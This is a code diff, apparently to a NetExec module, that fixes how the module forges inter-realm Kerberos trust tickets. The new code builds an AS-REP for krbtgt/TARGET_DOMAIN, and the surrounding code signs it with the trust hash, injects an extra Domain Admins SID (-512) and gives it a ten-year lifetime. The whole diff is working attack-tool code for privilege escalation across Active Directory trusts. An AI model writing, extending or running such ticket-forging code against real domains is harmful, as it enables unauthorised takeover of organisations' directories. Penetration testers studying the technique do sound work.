@@ -505,6 +505,7 @@ class NXCModule:
         extra_sid = f"{target_sid}-512"
         
         domain_upper = connection.domain.upper()
+        target_domain_upper = target_domain.upper()
         
         # Create ticket using the trust hash as the key
         enctype_value = EncryptionTypes.rc4_hmac.value
@@ -517,8 +518,9 @@ class NXCModule:
         pac_infos = self._createBasicPac(validation_info, admin_name)
         self._createRequestorInfoPac(pac_infos, self.current_domain_sid, user_rid)
         
-        # Build the AS-REP structure
-        as_rep = self._buildAsrep(domain_upper, admin_name, enctype_value)
+        # Build the AS-REP structure for inter-realm ticket
+        # The service name must be krbtgt/TARGET_DOMAIN for inter-realm tickets
+        as_rep = self._buildAsrepInterRealm(domain_upper, target_domain_upper, admin_name, enctype_value)
         enc_asrep_part, enc_ticket_part, pac_infos = self._buildEncParts(
             as_rep, domain_upper, admin_name, 87600, enctype_value, pac_infos
         )
@@ -682,6 +684,39 @@ class NXCModule:
         as_rep["enc-part"]["cipher"] = noValue
         return as_rep
 
+    def _buildAsrepInterRealm(self, source_domain: str, target_domain: str, username: str, enctype_value: int) -> AS_REP:
+        """Build AS-REP for inter-realm ticket (referral ticket)"""
+        as_rep = AS_REP()
+        as_rep["msg-type"] = ApplicationTagNumbers.AS_REP.value
+        as_rep["pvno"] = 5
+
+        as_rep["crealm"] = source_domain
+        as_rep["cname"] = noValue
+        as_rep["cname"]["name-type"] = PrincipalNameType.NT_PRINCIPAL.value
+        as_rep["cname"]["name-string"] = noValue
+        as_rep["cname"]["name-string"][0] = username
+
+        as_rep["ticket"] = noValue
+        as_rep["ticket"]["tkt-vno"] = ProtocolVersionNumber.pvno.value
+        # For inter-realm tickets, the realm should be the source domain
+        as_rep["ticket"]["realm"] = source_domain
+        as_rep["ticket"]["sname"] = noValue
+        as_rep["ticket"]["sname"]["name-type"] = PrincipalNameType.NT_SRV_INST.value
+        as_rep["ticket"]["sname"]["name-string"] = noValue
+        as_rep["ticket"]["sname"]["name-string"][0] = "krbtgt"
+        # The service instance is the target domain
+        as_rep["ticket"]["sname"]["name-string"][1] = target_domain
+
+        as_rep["ticket"]["enc-part"] = noValue
+        as_rep["ticket"]["enc-part"]["kvno"] = 2
+        as_rep["ticket"]["enc-part"]["etype"] = enctype_value
+
+        as_rep["enc-part"] = noValue
+        as_rep["enc-part"]["kvno"] = 2
+        as_rep["enc-part"]["etype"] = enctype_value
+        as_rep["enc-part"]["cipher"] = noValue
+        return as_rep
+
     def _injectExtraSids(self, pac_infos: dict, extra_sid_csv: str | None) -> None:
         if not extra_sid_csv or PAC_LOGON_INFO not in pac_infos:
             return
@@ -771,12 +806,13 @@ class NXCModule:
         enc_asrep_part["endtime"] = str(enc_ticket_part["endtime"])
         enc_asrep_part["starttime"] = str(enc_ticket_part["starttime"])
         enc_asrep_part["renew-till"] = str(enc_ticket_part["renew-till"])
-        enc_asrep_part["srealm"] = domain
+        # Copy the service realm and name from the as_rep ticket
+        enc_asrep_part["srealm"] = str(as_rep["ticket"]["realm"])
         enc_asrep_part["sname"] = noValue
-        enc_asrep_part["sname"]["name-type"] = PrincipalNameType.NT_SRV_INST.value
+        enc_asrep_part["sname"]["name-type"] = as_rep["ticket"]["sname"]["name-type"]
         enc_asrep_part["sname"]["name-string"] = noValue
-        enc_asrep_part["sname"]["name-string"][0] = "krbtgt"
-        enc_asrep_part["sname"]["name-string"][1] = domain
+        enc_asrep_part["sname"]["name-string"][0] = str(as_rep["ticket"]["sname"]["name-string"][0])
+        enc_asrep_part["sname"]["name-string"][1] = str(as_rep["ticket"]["sname"]["name-string"][1])
 
         return enc_asrep_part, enc_ticket_part, pac_infos
 
